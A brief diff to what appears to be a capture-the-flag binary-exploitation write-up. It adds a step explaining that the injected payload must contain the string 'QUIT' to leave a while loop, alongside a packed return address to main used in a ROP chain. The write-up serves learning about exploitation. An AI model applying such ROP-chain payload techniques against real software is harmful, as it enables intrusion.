@@ -136,6 +136,10 @@ Lastly, we will need to jump back to `main` function to inject our 2nd payload w
 ```python
 main = p64(0x004011ae) # The address of main function shown in Ghidra
 ```
+As mentioned above, our payload must contain the string "QUIT" to break out of the while loop:
+```python
+string = b"QUIT"
+```
 
 ### 1st ropchain:
 ```python
